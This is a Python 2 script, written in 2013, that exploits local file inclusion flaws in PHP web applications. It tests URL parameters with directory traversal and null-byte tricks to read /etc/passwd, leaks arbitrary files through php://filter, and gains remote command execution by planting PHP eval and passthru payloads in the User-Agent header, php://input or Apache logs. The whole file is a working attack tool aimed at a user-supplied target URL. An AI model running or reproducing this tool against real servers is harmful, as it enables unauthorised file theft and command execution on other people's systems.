#!/usr/bin/python

'''
@author : m_101
@year   : 2013
@desc   : script for exploiting LFI vulnerabilities
'''

import argparse
import base64
import re
import requests
import sys
import string
from random import *
# for url parsing
from urlparse import urlparse
# for cookie parsing
import Cookie
# for url encoding
import urllib

'''
TODO:
- randomize user agent
- implement path truncation techniques
- implement proper directory traversal techniques
- implement user custom string search
- implement array path leak trick
- implement testing POST parameters
- implement proxyfying
- take into account log length limitation for command injection through logs:
- cleaner + object oriented code
'''

class LFI ():
    files_exec = [
        # env
        { 'path' : '/proc/self/environ', 'type' : 'header' },

        # input
        { 'path' : 'php://input', 'type' : 'post' },

        # apache error logs
        { 'path' : '/var/log/apache2/error_log', 'type' : 'log' },
        { 'path' : '/var/log/apache2/error.log', 'type' : 'log' },
        { 'path' : '/var/log/apache/error_log', 'type' : 'log' },
        { 'path' : '/var/log/apache/error.log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/error_log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/error.log', 'type' : 'log' },
        { 'path' : '/var/log/error_log', 'type' : 'log' },
        { 'path' : '/var/log/error.log ', 'type' : 'log' },
        { 'path' : '/var/www/logs/error_log', 'type' : 'log' },
        { 'path' : '/var/www/logs/error.log', 'type' : 'log' },
        { 'path' : '/apache/logs/error.log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/error_log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/error.log', 'type' : 'log' },
        # access error logs
        { 'path' : '/var/log/apache2/access_log', 'type' : 'log' },
        { 'path' : '/var/log/apache2/access.log', 'type' : 'log' },
        { 'path' : '/var/log/apache/access_log', 'type' : 'log' },
        { 'path' : '/var/log/apache/access.log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/acces_log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/acces.log', 'type' : 'log' },
        { 'path' : '/var/log/access_log', 'type' : 'log' },
        { 'path' : '/var/log/access.log', 'type' : 'log' },
        { 'path' : '/var/www/logs/access_log', 'type' : 'log' },
        { 'path' : '/var/www/logs/access.log', 'type' : 'log' },
        { 'path' : '/apache/logs/access.log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/access_log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/access.log', 'type' : 'log' }
    ]

    def __init__ (self, original_url, replace = 'PAYLOAD', cookies = ''):
        # url submitted by user
        self.original_url = original_url
        # url with replace regexp
        self.pattern_url = original_url
        # replace regexp
        self.payload_placeholder = replace
        # delimiter tags
        self.tag_exec_code = rand_str (20)
        self.tag_start_exec = rand_str (20)
        self.tag_end_exec = rand_str (20)
        self.tag_inclusion = rand_str (20)
        # cookies
        if cookies == '':
            self.cookies = dict ()
        else:
            self.load_cookies (cookies)

        # http headers
        # we are IE7
        self.headers = {
                'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)'
        }

        # for path truncation
        self.path_prefix = ''
        self.path_suffix = ''

        # root path
        self.root_path = ''

        # base url
        self.base_url = ''

    # load cookies string
    def load_cookies (self, raw_cookies):
        # parse cookies
        base_cookies = Cookie.BaseCookie()
        base_cookies.load (raw_cookies)
        # rebuild proper simple dictionary
        self.cookies = dict()
        for key, morsel in base_cookies.items():
            self.cookies[key] = morsel.value

    def build_query (self, params, idx_test, test_value):
        idx_name = 1
        query = ''
        test_name = ''
        # build test query with single tested param
        for name, value in params.items():
            if idx_name == idx_test:
                query += name + '=' + test_value
                test_name = name
            else:
                query += name + '=' + value
            # avoid separator ending query
            if idx_name != len (params):
                query += '&'
            idx_name += 1
        
        # add prefix and suffix for path truncation or NULL byte injection
        if self.path_prefix:
            query = self.path_prefix + query
        if self.path_suffix:
            query += self.path_suffix

        # result
        return (test_name, query)

    def do_test (self, method, payload, form = dict()):
        url = self.pattern_url.replace (self.payload_placeholder, payload)
        if method == 'get':
            req = requests.get (url)
        elif method == 'post':
            req = requests.post (url, data=form)
        return req

    # test all params and check vuln
    # TODO : improve inclusion detection
    def find_vuln_param (self):
        # parsing url and separating in elements
        parsed = urlparse (self.original_url)

        # get params
        params = parsed.query.split ('&')
        fields = dict()
        for param in params:
            (name, value) = param.split ('=')
            fields[name] = value

        # test each param for LFI
        found_name = ''
        found_idx_name = 1
        for idx_test in range (1, len (fields) + 1):
            # passwd test with NULL byte injection
            print '[+] Test NULL byte injection'
            (test_name, query) = self.build_query (fields, idx_test, '../../../../../../../../../../../../etc/passwd\x00')
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # with passwd file
            if len (re.findall ('root:', req.text)) != 0:
                print 'Is vulnerable with param: {0}!'.format (test_name)
                print 'Is vulnerable to NULL byte poisoning'
                found_name = test_name
                found_idx_name = idx_test
                self.path_suffix = '\x00'
                break

            # passwd test
            print '[+] Test simple inclusion'
            (test_name, query) = self.build_query (fields, idx_test, '../../../../../../../../../../../../etc/passwd')
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # with passwd file
            if len (re.findall ('root:', req.text)) != 0:
                print 'Is vulnerable with param: {0}!'.format (test_name)
                found_name = test_name
                found_idx_name = idx_test
                break

            # random string test
            print '[+] Test random string inclusion'
            (test_name, query) = self.build_query (fields, idx_test, self.tag_inclusion)
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # first with random string
            if len (re.findall ('function.include', req.text)) != 0 and len (re.findall (self.tag_inclusion, req.text)) != 0:
                print 'Is vulnerable with param {0}!'.format (test_name)
                found_name = test_name
                found_idx_name = idx_test
                break

        # rebuild potential vulnerable url
        (test_name, query) = self.build_query (fields, found_idx_name, self.payload_placeholder)

        # rebuild url
        self.base_url = parsed.scheme + '://' + parsed.netloc
        url = self.base_url + parsed.path + '?' + query
        self.base_url += '/'

        # return result if potentially vulnerable
        if len (found_name) == 0:
            return None
        else:
            self.pattern_url = url
            return url

    # check if we got code exec
    def check_exec (self, content):
        lines = content.split ('\n')
        regexp = re.compile (self.tag_exec_code)
        for line in lines:
            if len (regexp.findall (line)) != 0:
                return True
        return False

    # find LFI code execution path
    # TODO : user-agent
    def try_exec (self):
        # we are IE7
        headers = dict (self.headers)

        has_exec = None
        payload = '<?php echo "' + self.tag_exec_code + '"; ?>'
        for lfi in self.files_exec:
            print '[+] Testing : {0}'.format (lfi)
            # param
            if lfi['type'] == 'header':
                headers['User-Agent'] = payload
            elif lfi['type'] == 'post':
                form = payload
            elif lfi['type'] == 'log':
                url = self.base_url + urllib.quote (payload)
                req = requests.get (url, headers=headers, cookies=self.cookies)
            # prepare url
            url = self.pattern_url.replace (self.payload_placeholder, self.root_path + lfi['path'])
            print '    {0}'.format (url)
            # exec
            if lfi['type'] == 'post':
                req = requests.post (url, headers=headers, data=form)
            else:
                req = requests.get (url, headers=headers, cookies=self.cookies)
            # has code exec?
            if self.check_exec (req.text):
                has_exec = lfi
                break
        return has_exec

    # do exec
    # TODO : randomize user-agent
    def do_exec (self, lfi, cmd):
        # copy original pattern url
        purl = self.pattern_url[:]
        # we are IE7
        headers = dict(self.headers)
        payload = '<?php echo "' + self.tag_start_exec + '"; passthru ("{0}"); echo "' + self.tag_end_exec + '"; ?>'
        payload = payload.format (cmd)
        # param
        if lfi['type'] == 'header':
            headers['User-Agent'] = payload
        elif lfi['type'] == 'post':
            form = {
                    payload
            }
        elif lfi['type'] == 'log':
            payload_exec = '<?php eval ($_GET["p"]); ?>'
            url = self.base_url + urllib.quote (payload_exec)
            req = requests.get (url, headers=headers, cookies=self.cookies)
            payload = '&p=echo "' + self.tag_start_exec + '"; passthru ("{0}"); echo "' + self.tag_end_exec + '"; '
            payload = payload.format (cmd)
            purl += payload
        # prepare url
        url = purl.replace (self.payload_placeholder, self.root_path + lfi['path'])
        # exec
        req = requests.get (url, headers=headers, cookies=self.cookies)
        # extract result
        results = self.scrap_exec_results (req.text)
        return results
    '''
    TODO : implement truncation methods:
    - dot truncation
    - path truncation
    - reverse path truncation
    - NULL byte poisoning
    - good error/correct detection
    '''
    def find_path_truncation (self, url):
        dir_traversals = [
                '../',
                '..\\'
        ]

        # check for path truncation
        for length in range (1, 4097):
            attack = '/.' * length

    # find root path using /etc/passwd as a reference
    def find_root (self):
        max_traversal = 10
        regexp_passwd = re.compile ('root:')
        for count in range (1, max_traversal):
            traversal = '../' * count
            url = self.pattern_url.replace (self.payload_placeholder, traversal + 'etc/passwd' + self.path_suffix)
            req = requests.get (url, cookies=self.cookies)
            if len (regexp_passwd.findall (req.text)) != 0:
                self.root_path = traversal
                return traversal
        return None

    # get results of command execution
    def scrap_exec_results (self, content):
        # regexp
        regexp_start = re.compile ('.*' + self.tag_start_exec + '.*')
        regexp_end = re.compile ('.*' + self.tag_end_exec + '.*')
        # results
        results = list()
        # result start and end
        found_start = False
        found_end = False
        # getting lines
        lines = content.split ('\n')
        # search for start and end
        # keep what's between start and end needles
        for line in lines:
            if found_start and found_end:
                break
            if found_start == False and len (regexp_start.findall (line)) != 0:
                line = re.sub ('.*' + self.tag_start_exec, '', line)
                found_start = True
            if found_start == True and found_end == False and len (regexp_end.findall (line)) != 0:
                line = re.sub (self.tag_end_exec + '.*', '', line)
                found_end = True
            if found_start == True and len (line) != 0:
                results.append (line)
        return results

    def do_leak (self, filename):
        php_filter = 'php://filter/convert.base64-encode/resource=' + filename
        url = self.pattern_url.replace (self.payload_placeholder, php_filter)
        req = requests.get (url, cookies=self.cookies)
        print url

        # leak file
        results = scrap_b64str (req.text)
        if len (results) != 0:
            return results

        print '[-] php://filter technique failed'
        print '[+] testing direct injection'
        # we don't use path_prefix so we can read any file easily
        url = self.pattern_url.replace (self.payload_placeholder, filename + self.path_suffix)
        req = requests.get (url, cookies=self.cookies)
        return [req.text]

# extract all potential base64 strings
# decode correct one and store potentials
def scrap_b64str (content):
    # search for base64 strings, shorter than 17 chars is refused
    regexp_b64 = re.compile ('[A-Za-z0-9+/=]{16,}=+')
    words = regexp_b64.findall (content)

    # validate each base64
    # if validated it is added to our list
    results = list()
    for word in words:
        # detect proper base64 string
        found = True
        decoded = ''
        try:
            decoded = base64.b64decode (word)
        except Exception:
            found = False

        # detect potential base64 string (maybe broken base64?)
        if found == False and len (re.findall ('=+$', word)) != 0:
            decoded = word
            found = True

        # store potential base64 string and properly decoded base64 strings
        if found == True and len (decoded) != 0:
            results.append (decoded)
    # return all base64 strings
    return results

def rand_str (length):
    charset = string.letters + string.digits
    return ''.join(choice(charset) for idx in range(length))

# argument parser
parser = argparse.ArgumentParser(description='Exploit LFI')
parser.add_argument('--url', '-u', nargs=1, type=str, help='URL to attack', required=True)
parser.add_argument('--action', '-a', nargs=1, default='read', help='exec or read (default)')
parser.add_argument('--option', '-o', nargs=1, type=str, help='Action argument', required=True)
parser.add_argument('--replace', '-r', nargs=1, default='PAYLOAD', help='string to replace')
parser.add_argument('--cookies', '-c', nargs=1, default='', help='Cookies')
args = parser.parse_args ()

attack = LFI(args.url[0], args.replace)
if args.cookies != '':
    attack.load_cookies (args.cookies[0])

print '[+] Checking vulnerability'
vuln_url = attack.find_vuln_param ()
if vuln_url == None:
    print '[-] Did not find any vulnerable param'
    exit (1)
print '[+] Found vulnerability, new URL : {0}'.format (vuln_url)
print '[+] Searching for root path'
root_path = attack.find_root ()
print 'root : {0}'.format (root_path)
if root_path:
    purl = vuln_url.replace (args.replace, root_path + args.replace)
else:
    purl = vuln_url
print '[+] New URL : {0}'.format (purl)

if args.action == 'exec' or args.action[0] == 'exec':
    # check if we got code execution through LFI
    lfi = attack.try_exec ()
    if lfi == None:
        print 'No code exec!'
    else:
        # exec command
        results = attack.do_exec (lfi, args.option[0])

        # print result
        if len (results) == 0:
            print 'No result : Bad command or no permission?'
        else:
            for result in results:
                print result
else:
    # leak file
    results = attack.do_leak (args.option[0])

    # print results
    if len (results) == 0:
        print 'No result : Not vulnerable or no permission?'
    else:
        for result in results:
            print result

